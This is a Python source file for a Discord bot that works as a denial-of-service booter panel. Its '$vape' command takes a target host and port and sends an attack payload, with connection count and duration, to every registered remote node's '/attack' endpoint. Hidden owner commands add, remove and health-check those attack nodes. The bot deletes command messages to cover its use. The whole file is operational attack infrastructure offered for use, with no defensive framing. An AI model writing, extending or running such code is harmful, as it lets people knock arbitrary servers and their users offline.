import discord
from discord.ext import commands
import aiohttp
import asyncio
import json
import os
import time
import config

APIS_FILE = os.path.join(os.path.dirname(__file__), "apis.json")

def load_apis():
    if os.path.exists(APIS_FILE):
        with open(APIS_FILE, "r") as f:
            return json.load(f)
    return {}

def save_apis(data):
    with open(APIS_FILE, "w") as f:
        json.dump(data, f, indent=2)

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="$", intents=intents, help_command=None)

# global cooldown: unix timestamp when cooldown expires
_cooldown_until: float = 0.0


def is_authorized():
    async def predicate(ctx):
        return ctx.author.id in config.AUTHORIZED_USER_IDS or ctx.author.id == config.OWNER_ID
    return commands.check(predicate)

def is_owner():
    async def predicate(ctx):
        return ctx.author.id == config.OWNER_ID
    return commands.check(predicate)


@bot.command(name="vape")
@is_authorized()
async def vape(ctx, host: str = None, port: str = None):
    if host is None or port is None:
        return

    try:
        port_int = int(port)
        if port_int < 1 or port_int > 65535:
            return
    except ValueError:
        return

    global _cooldown_until
    now = time.time()
    if now < _cooldown_until:
        remaining = int(_cooldown_until - now)
        await ctx.message.delete()
        msg = await ctx.send(
            f"Vape Servers are busy right now, please try again in **{remaining}s**.",
            delete_after=10
        )
        return

    cooldown_total = config.DURATION + config.COOLDOWN_EXTRA
    _cooldown_until = now + cooldown_total

    embed = discord.Embed(color=config.EMBED_COLOR)
    embed.add_field(name="Target IPv4/Host", value=f"`{host}`",       inline=False)
    embed.add_field(name="Port",             value=f"`{port_int}`",   inline=False)
    embed.add_field(name="Time",             value=f"`{config.DURATION}s`", inline=False)
    embed.set_footer(text=config.EMBED_FOOTER)

    await ctx.message.delete()
    await ctx.send(embed=embed)

    apis = load_apis()
    if not apis:
        return

    payload = {
        "host":        host,
        "port":        port_int,
        "connections": config.CONNECTIONS,
        "duration":    config.DURATION,
        "lownet":      config.LOWNET,
    }

    async def fire(url):
        try:
            async with aiohttp.ClientSession() as session:
                async with session.post(
                    f"{url.rstrip('/')}/attack",
                    json=payload,
                    timeout=aiohttp.ClientTimeout(total=10)
                ) as _:
                    pass
        except Exception:
            pass

    await asyncio.gather(*[fire(v["url"]) for v in apis.values()])


@bot.group(name="owxaddr", invoke_without_command=True)
@is_owner()
async def owxaddr(ctx):
    pass


@owxaddr.group(name="api", invoke_without_command=True)
@is_owner()
async def owxaddr_api(ctx):
    pass


@owxaddr_api.command(name="add")
@is_owner()
async def api_add(ctx, name: str = None, url: str = None, bandwidth: str = "?"):
    if name is None or url is None:
        return
    apis = load_apis()
    apis[name] = {"url": url, "bandwidth": bandwidth}
    save_apis(apis)
    await ctx.message.delete()
    await ctx.send(f"Node `{name}` added.", delete_after=8)


@owxaddr_api.command(name="remove")
@is_owner()
async def api_remove(ctx, name: str = None):
    if name is None:
        return
    apis = load_apis()
    if name in apis:
        del apis[name]
        save_apis(apis)
    await ctx.message.delete()
    await ctx.send(f"Node `{name}` removed.", delete_after=8)


@owxaddr_api.command(name="ping")
@is_owner()
async def api_ping(ctx):
    await ctx.message.delete()
    apis = load_apis()
    if not apis:
        await ctx.send("No nodes configured.", delete_after=8)
        return

    async def check(name, entry):
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(
                    f"{entry['url'].rstrip('/')}/ping",
                    timeout=aiohttp.ClientTimeout(total=5)
                ) as resp:
                    return name, entry.get("bandwidth", "?"), resp.status == 200
        except Exception:
            return name, entry.get("bandwidth", "?"), False

    results = await asyncio.gather(*[check(n, e) for n, e in apis.items()])

    lines = []
    for name, bw, online in results:
        status = "🟢 Online" if online else "🔴 Offline"
        lines.append(f"`{name}` — {bw} — {status}")

    embed = discord.Embed(description="\n".join(lines), color=config.EMBED_COLOR)
    embed.set_footer(text=config.EMBED_FOOTER)
    await ctx.send(embed=embed, delete_after=30)


@vape.error
async def vape_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.message.delete()


@owxaddr.error
@owxaddr_api.error
@api_add.error
@api_remove.error
@api_ping.error
async def owner_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.message.delete()


bot.run(config.BOT_TOKEN)
